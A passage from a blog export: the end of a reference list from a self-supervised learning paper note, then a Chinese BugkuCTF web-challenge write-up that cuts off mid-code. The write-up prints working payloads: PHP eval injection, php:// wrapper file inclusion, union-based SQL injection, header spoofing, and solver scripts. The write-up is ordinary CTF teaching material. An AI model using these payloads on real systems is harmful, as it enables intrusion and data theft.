<hr>
<p><strong>参考链接：</strong></p>
<p><strong>部分参考文献：</strong></p>
<p>[8] A. Krizhevsky , I. Sutskever, and G. E. Hinton, “Imagenet classification with deep convolutional neural networks,” in NIPS, pp. 1097–1105, 2012. </p>
<p>[9] K. Simonyan and A. Zisserman, “V ery deep convolutional networks for large-scale image recognition,” ICLR, 2015. </p>
<p>[10] C. Szegedy , W. Liu, Y . Jia, P . Sermanet, S. Reed, D. Anguelov , D. Erhan, V . Vanhoucke, and A. Rabinovich, “Going deeper with convolutions,” CVPR, 2015. </p>
<p>[11] K. He, X. Zhang, S. Ren, and J. Sun, “Deep residual learning for image recognition,” in CVPR, pp. 770–778, 2016. </p>
<p>[12] G. Huang, Z. Liu, K. Q. Weinberger, and L. van der Maaten, “Densely connected convolutional networks,” in CVPR, vol. 1, p. 3, 2017.</p>
<p>[15] C. Ledig, L. Theis, F. Huszar, J. Caballero, A. Cunningham,<br>A. Acosta, A. P . Aitken, A. Tejani, J. Totz, Z. Wang, and W. Shi,<br>“Photo-realistic single image super-resolution using a generative<br>adversarial network,” in CVPR.</p>
<p>[18] R. Zhang, P . Isola, and A. A. Efros, “Colorful image colorization,”<br>in ECCV, pp. 649–666, Springer, 2016.</p>
<p>[19] D. Pathak, P . Krahenbuhl, J. Donahue, T. Darrell, and A. A. Efros, “Context encoders: Feature learning by inpainting,” in CVPR, pp. 2536–2544, 2016.</p>
<p>[20] M. Noroozi and P . Favaro, “Unsupervised learning of visual representions by solving jigsaw puzzles,” in ECCV, 2016.</p>
<p>[21] D. Mahajan, R. B. Girshick, V . Ramanathan, K. He, M. Paluri, Y . Li, A. Bharambe, and L. van der Maaten, “Exploring the limits of weakly supervised pretraining,” in ECCV, pp. 185–201, 2018.</p>
<p>[22] W. Li, L. Wang, W. Li, E. Agustsson, and L. Van Gool, “Webvision database: Visual learning and understanding from web data,” arXiv preprint arXiv:1708.02862, 2017.</p>
<p>[23] A. Mahendran, J. Thewlis, and A. V edaldi, “Cross pixel optical flow similarity for self-supervised learning,” arXiv preprint arXiv:1807.05636, 2018. </p>
<p>[24] N. Sayed, B. Brattoli, and B. Ommer, “Cross and learn: Crossmodal self-supervision,” arXiv preprint arXiv:1811.03879, 2018. </p>
<p>[25] B. Korbar, D. Tran, and L. Torresani, “Cooperative learning of audio and video models from self-supervised synchronization,” in NIPS, pp. 7773–7784, 2018.</p>
<p>[26] A. Owens and A. A. Efros, “Audio-visual scene analysis with self-supervised multisensory features,” arXiv preprint arXiv:1804.03641, 2018. </p>
<p>[27] D. Kim, D. Cho, and I. S. Kweon, “Self-supervised video representation learning with space-time cubic puzzles,” arXiv preprint arXiv:1811.09795, 2018. </p>
<p>[28] L. Jing and Y . Tian, “Self-supervised spatiotemporal feature learning by video geometric transformations,” arXiv preprint arXiv:1811.11387, 2018. </p>
<p>[29] B. Fernando, H. Bilen, E. Gavves, and S. Gould, “Self-supervised video representation learning with odd-one-out networks,” in CVPR, 2017. </p>
<p>[30] Z. Ren and Y . J. Lee, “Cross-domain self-supervised multi-task feature learning using synthetic imagery ,” in CVPR, 2018. </p>
<p>[31] X. Wang, K. He, and A. Gupta, “Transitive invariance for selfsupervised visual representation learning,” in ICCV, 2017. </p>
<p>[32] C. Doersch and A. Zisserman, “Multi-task self-supervised visual learning,” in ICCV, 2017. </p>
<p>[33] T. N. Mundhenk, D. Ho, and B. Y . Chen, “Improvements to context based self-supervised learning,” in CVPR, 2018. </p>
<p>[34] M. Noroozi, A. Vinjimoor, P . Favaro, and H. Pirsiavash, “Boosting self-supervised learning via knowledge transfer,” arXiv preprint arXiv:1805.00385, 2018. </p>
<p>[35] U. Büchler, B. Brattoli, and B. Ommer, “Improving spatiotemporal self-supervision by deep reinforcement learning,” in ECCV, pp. 770–786, 2018.</p>
<p>[40] I. Misra, C. L. Zitnick, and M. Hebert, “Shuffle and learn: unsupervised learning using temporal order verification,” in ECCV, pp. 527–544, Springer, 2016.</p>
<p>[44] M. Caron, P . Bojanowski, A. Joulin, and M. Douze, “Deep clustering for unsupervised learning of visual features,” in ECCV, 2018.</p>
<p>[54] J. Donahue, L. A. Hendricks, S. Guadarrama, M. Rohrbach, S. V enugopalan, K. Saenko, and T. Darrell, “Long-term recurrent convolutional networks for visual recognition and description,” in CVPR, 2015.</p>
<p>[73] S. Hochreiter and J. Schmidhuber, “Long short-term memory,” Neural computation, vol. 9, no. 8, pp. 1735–1780, 1997</p>
<p>[81] D. Pathak, R. Girshick, P . Dollár, T. Darrell, and B. Hariharan, “Learning features by watching objects move,” in CVPR, vol. 2, 2017</p>
<p>[82] G. Larsson, M. Maire, and G. Shakhnarovich, “Colorization as a proxy task for visual understanding,” in CVPR, 2017.</p>
<p>[85] C. V ondrick, H. Pirsiavash, and A. Torralba, “Generating videos with scene dynamics,” in NIPS, pp. 613–621, 2016.</p>
<p>[86] S. Tulyakov , M.-Y . Liu, X. Yang, and J. Kautz, “Mocogan: Decomposing motion and content for video generation,” CVPR, 2018.</p>
<p>[93] R. Arandjelovic and A. Zisserman, “Look, listen and learn,” in ICCV, pp. 609–617, IEEE, 2017.</p>
<p>[137] R. Zhang, J.-Y . Zhu, P . Isola, X. Geng, A. S. Lin, T. Yu, and A. A.<br>Efros, “Real-time user-guided image colorization with learned<br>deep priors,” arXiv preprint arXiv:1705.02999, 2017.</p>
<p>[138] S. Iizuka, E. Simo-Serra, and H. Ishikawa, “Let there be color!:<br>joint end-to-end learning of global and local image priors for<br>automatic image colorization with simultaneous classification,”<br>TOG, vol. 35, no. 4, p. 110, 2016.</p>
<p>[155] T. Zhou, M. Brown, N. Snavely , and D. G. Lowe, “Unsupervised learning of depth and ego-motion from video,” in CVPR, vol. 2, p. 7, 2017</p>
<p>[167] S. Abu-El-Haija, N. Kothari, J. Lee, P . Natsev , G. Toderici, B. Varadarajan, and S. Vijayanarasimhan, “Youtube-8m: A large-scale video classification benchmark,” arXiv preprint arXiv:1609.08675, 2016. </p>
<p>[168] L. Gomez, Y . Patel, M. Rusi˜ nol, D. Karatzas, and C. Jawahar, “Self-supervised learning of visual features through embedding images into text topic spaces,” in CVPR, IEEE, 2017.</p>
]]></content>
      <categories>
        <category>PaperNote</category>
      </categories>
      <tags>
        <tag>自监督学习</tag>
      </tags>
  </entry>
  <entry>
    <title>BugkuCTF_Web_Writeup</title>
    <url>/2019/03/07/BugkuCTF-Writeup%E2%80%94%E2%80%94Web/</url>
    <content><![CDATA[<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>直接查看F12查看源码即可得flag。</p>
<p><br></p>
<h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>简单计算题，但输入框限制输入长度，直接改改输入框的前端代码，输入计算结果，得到flag。</p>
<p><br></p>
<h4 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h4><p>代码审计，GET方法传入what变量的值为’flag’即可得flag。<br>payload：<code>?what=flag</code></p>
<p><br></p>
<h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><p>遇上一题类似，只不过是以POST方式传参，在Firefox浏览器中的Hackbar中传入：<code>what=flag</code></p>
<p><br></p>
<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="*矛盾"></a>*矛盾</h4><p>代码审计，要求传入的<code>$num</code>即不能是数字，又要等于1，才能输出flag。<br>这不是矛盾吗？我这里提供两种绕过思路构造<code>$num</code><br>（1） 在php里可以用<code>.</code>来连接字符串，所以当构造<code>num=1.&#39; &#39;</code>时，num就被当做了字符串，但由于后面连接的字符串为空，在弱比较的时候仍然会判断与1相等。<br>（2）可以想到用科学计数法表示数字1，例如：<code>1E+0.1</code>既不是纯数字，其实际值又等于1。</p>
<p>所以<code>payload</code>为<code>?num=1.&#39; &#39;</code> 或 <code>?1E+0.1</code></p>
<p><br></p>
<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>查看源代码发现一串Unicode编码，在线解码网站解码即得flag</p>
<p><br></p>
<h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>把flag.bugku.com 解析到120.24.86.145即可得flag。<br>在<code>c:\windows\system32\drivers\etc\</code>目录下打开hosts<br>后进行修改，在最后添加上我们需要的    <code>120.24.86.145 flag.bugku.com</code><br>再访问flag.bugku.com即得flag</p>
<p><br></p>
<h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><p>题目要求<code>Stop at panda</code>，就能得到flag，但是页面上的图片再不断变化，可以BurpSuite抓包后，多次重发包，然后没几次就能看到flag。</p>
<p><br></p>
<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="*本地包含"></a>*本地包含</h4><p>这道题还是可以分析一下的，关键主要时闭合、构造php代码。<br>打开题目，发现如下代码：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190306005257159.png" alt="在这里插入图片描述"></p>
<ul>
<li>首先判断肯定要通过hello传一个参数进去。</li>
<li>然后看到了<code>eval()</code>这个函数，在CTF比赛中要对这个函数非常敏感，它可以将函数里的字符串当作php代码来解析，再结合题目名：文件包含，思路应该是通过这个函数将php代码以参数传进去，来包含flag.php函数获得flag。</li>
<li>但是<code>eval()</code>函数还有一个<code>var_dump()</code>函数处理传入的参数，这时就需要先对这个函数进行闭合，然后<code>eval()</code>函数就能执行后面的php代码了。(闭合了前面的括号，别忘了最后还有一个括号)</li>
</ul>
<p>最终构造的payload：<code>?hello=);echo file_get_contents(&#39;flag.php&#39;</code><br>然后，查看网页源码，flag在源码里。</p>
<p><br></p>
<h4 id="变量1"><a href="#变量1" class="headerlink" title="*变量1"></a>*变量1</h4><p>代码审计，考察php可变变量，构造<code>?args=GLOBALS</code>，即得flag。</p>
<p><br></p>
<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><p>查看源代码，在线JSfuck解密，将得到的字符串大写提交即可。<br>解密网站：<a href="http://discogscounter.getfreehosting.co.uk/js-noalnum.php" target="_blank" rel="noopener">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p>
<p><br></p>
<h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><p>flag就在http返回头里，Chrome F12-Network-F5刷新或者BurpSuite抓包即可看到flag</p>
<p><br></p>
<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><p>扫描目录发现shell.php，根据题目，这应该是留的后门，直接用burpsuite爆破密码即可，密码为：hack</p>
<p><br></p>
<h4 id="管理员系统"><a href="#管理员系统" class="headerlink" title="*管理员系统"></a>*管理员系统</h4><p>抓包后先在请求头里增加：</p>
<pre><code>X-Forwarded-For: 127.0.0.1
</code></pre><p>来伪装本地ip。<br>查看源代码最后一行有一个base64字符串，解码后为<code>test123</code>（这其实是密码，一开始可能会当作用户名），用户名为：<code>admin</code>，在burpsuite里面重发包，得到flag。</p>
<p><br></p>
<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>将源码里的JS代码url解码再拼接，然后审计代码，再password框里输入：<code>67d709b2b54aa2aa648cf6e87a7114f1</code>，得到flag<br><br></p>
<h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><p>进入后有一个<code>&#39;click me? no&#39;</code>链接，点击后url跳转到<code>?file=show.php</code>，判断应该为本地文件包含，利用php伪协议。<br>根据题目<code>“flag在index里”</code>，所以应包含<code>index.php</code>构造如下payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre><p>得到一段base64，解码得flag。</p>
<p><br></p>
<h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><p>输入5位数得密码，告诉了位数（url里也提示了baopo），那就抓包在burpsuite里爆破即可。</p>
<p><br></p>
<h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><p>要点击100万次才行，显然不可能手点，Chrome F12查看源码，看到一段JavaScript代码，复制到Console控制台，并将点击时得<code>count++</code>代码改为<code>count+=999999</code>，然后回车，这样再点一次页面就到100万次啦。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190306174554688.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><p>根据提示访问<code>index.php.bak</code>（bak是常见得备份文件），下载源码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>代码审计得知，要构造<code>key1、key2</code>的值，使他们md5值相等，真值不同。<br>但这里通过 <code>str_replace(&#39;key&#39;,&#39;&#39;,$str)</code>过滤了<code>key</code>，把字符串里面得<code>key</code>替换为空了，但可以双写绕过。<br>最终payload：<code>?kkeyey1[]=1&amp;kkeyey2[]=2</code><br><br></p>
<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>一道没有任何过滤的sql注入题<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' order by <span class="number">4</span> #</span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> #</span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name from information_schema.tables where table_schema=database() #</span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,column_name from information_schema.columns where table_name='fl4g' #</span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(select skctf_flag from fl4g) #</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="*秋名山老司机"></a>*秋名山老司机</h4><p>这题得写脚本来计算结果并提交，脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line"><span class="comment"># 正则表达式匹配算式，并将算是以字符串形式保存在expression中</span></span><br><span class="line">result = eval(expression)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据提示，将计算结果，以post方式传入value</span></span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125; </span><br><span class="line">print(s.post(url, data=post).text)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">正则表达式第二种方法</span></span><br><span class="line"><span class="string">expression = re.findall(r'&lt;div&gt;(.*?)=?;&lt;/div&gt;', source)</span></span><br><span class="line"><span class="string">findall()输出内容只是括号匹配到的内容，不是所有内容,且以列表的形式保存</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">expression = "".join(expression)</span></span><br><span class="line"><span class="string">将列表里的算式转换成字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">expression = expression[:-2]</span></span><br><span class="line"><span class="string">去掉算式最后的'=？'</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="*速度要快"></a>*速度要快</h4><p>（1）先抓包，在返回头里有一串base64，解码得一句话：<code>跑的还不错，给你flag吧: NDE5NzA1</code>，很显然这肯定不是最终结果。<br>（2）查看源码，发现注释里也有一句话：<code>OK ,now you have to post the margin what you find</code>，意思，意思就是让你把刚刚发现得东西用post传给<code>margin</code><br>（3）但是发现其实刚刚抓包得到得一串字符每次都不一样，再结合题目“速度要快”，看来也是要写脚本，将得到的字符串，立刻再传过去。</p>
<p>最终使用脚本如下，即可得到flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web6/'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag在头部信息里</span></span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(headers[<span class="string">'flag'</span>]) <span class="comment"># b64decode解码出来为byte类型</span></span><br><span class="line"></span><br><span class="line">margin = flag.decode().split(<span class="string">': '</span>)[<span class="number">1</span>]    <span class="comment"># 使用split()前，要先将byte转换为str</span></span><br><span class="line"><span class="comment"># split的结果以列表的形式储存，所以取索引[1]来取冒号后面的字符串</span></span><br><span class="line"></span><br><span class="line">margin = base64.b64decode(margin) </span><br><span class="line">post = &#123;<span class="string">'margin'</span>:margin&#125;</span><br><span class="line">print(s.post(url, data=post).text)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="*cookies欺骗"></a>*cookies欺骗</h4><p>（1）观察URL有点不对劲：<code>?line=&amp;filename=a2V5cy50eHQ=</code>，里面有串base64，解密为：keys.txt，根据<code>line</code>与<code>filename</code>判断这个URL意思应该是读取了keys.txt这个文件得第0行。<br>（2）根据推测，将后面得base64改为index.php得base64编码，即构造<code>?line=&amp;filename=aW5kZXgucGhw</code>，返回的是空白页面，但是源码里面可以看到<code>&lt;?php</code>，于是增大<code>line</code>的值就可以看到一行行代码，可以写个简单的脚本来获取<code>index.php</code>的源码：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_code.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web11/index.php'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    payload = &#123;<span class="string">'line'</span>:line, <span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125; <span class="comment"># 这里filename为index.php的base64编码</span></span><br><span class="line">    print(s.get(url, params=payload).text)</span><br></pre></td></tr></table></figure></p>
<p>可以得到index.php的源码如下:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">	$fa = file($file);</span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到源码后，进行简单的代码审计，即要传入COOKIE: <code>margin:&#39;margin&#39;</code>，且提示了<code>keys.php</code>，因此可以写如下脚本来获得flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy5waHA='</span></span><br><span class="line"><span class="comment">#根据index.php源码得这里filename为keys.php的base64编码</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">cookies = dict(margin=<span class="string">'margin'</span>)</span><br><span class="line"></span><br><span class="line">print(s.get(url, cookies=cookies).text)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="*never give up"></a>*never give up</h4><p>（1）先看源码，发现<code>1p.html</code>，于是访问此页面，但是一访问就会自动跳转到bugku的首页，于是抓包，看到一大串东西。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/2019030719584180.png" alt="在这里插入图片描述"><br>（2）将这一大串东西先URL解码，再base64，再URL解码得到如下代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Words =<span class="string">"&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;!--"</span>;<span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>--&gt;<span class="string">" </span></span><br><span class="line"><span class="string">function OutWord()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">var NewWords;</span></span><br><span class="line"><span class="string">NewWords = unescape(Words);</span></span><br><span class="line"><span class="string">document.write(NewWords);</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">OutWord();</span></span><br></pre></td></tr></table></figure></p>
<p>（3）紧接着进行代码审计，关键是要传参满足下面这些条件：</p>
<pre><code>1.$data==&quot;bugku is a nice plateform!&quot; 
2.$id==0
3.strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)  and substr($b,0,1)!=4
</code></pre><p>第一个条件：根据前面的<code>$data = @file_get_contents($a,&#39;r&#39;)</code>判断是文件包含，包含的文件里要有<code>bugku is a nice plateform!</code>，可以利用<code>php://input</code>伪协议即可，不了解的可以参考：<a href="https://blog.csdn.net/qq_42181428/article/details/87090539" target="_blank" rel="noopener">CTF中文件包含漏洞总结</a><br>构造的payload为：<code>?a=php://input</code>，并再post里传入：<code>bugku is a nice plateform!</code></p>
<p>第二个条件简单，<code>if(!$_GET[&#39;id&#39;])</code>限制了id必须非0，但由于后面判断的时候用的是松散比较比较<code>==</code>，<code>$id</code> 若想满足非空非零且弱等于整型数 0，则 <code>$id</code> 的值只能为非空非零字符串，这里假设 ，因此我这里构造：<code>?id=qwe</code><br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190307202656683.png" alt="在这里插入图片描述"></p>
<p>第三个条件就是对<code>$b</code>的构造，有下面三个条件:</p>
<ul>
<li>b的长度要大于5</li>
<li>1114要和111加上b的第一位匹配</li>
<li>b的第一位不等于4<br>因为再php正则表达实里<code>.</code>(点号)，可以作为通配符，因此这里可构造b的第一位为点号，然后在任意构造大于5位的数字即可，如：<code>b=.123456</code></li>
</ul>
<p>因此综上所述，最终构造的payload为：<code>?id=qwe&amp;a=php://input&amp;b=.1234567</code>，并且在post里传入：<code>bugku is a nice plateform!</code><br>这里直接用浏览器的话，会看到flag一闪而过，可以用burpsuite抓包就行了。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190307203416297.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a>welcome to bugku</h4><p>（1）先看源码，看到注释里给了一段代码：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190307204153152.png" alt="在这里插入图片描述"><br>用到了<code>php://input</code>和<code>php://filte</code>伪协议，不清楚的可以看我之前一篇文章：<a href="https://blog.csdn.net/qq_42181428/article/details/87090539" target="_blank" rel="noopener">CTF中文件包含漏洞总结</a><br>构造的payload：<code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>，并在post里传入：<code>welcome to the bugkuctf</code>，得到一段base64<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190307204259721.png" alt="在这里插入图片描述"><br>（2）将得到base64解码得到下面<code>hint.php</code>的代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再按照第一步的方法尝试包含<code>flag.php</code>的内容，但是得到一串中文乱码，于是再尝试包含<code>index.php</code>文件，base64解码后得到如下代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    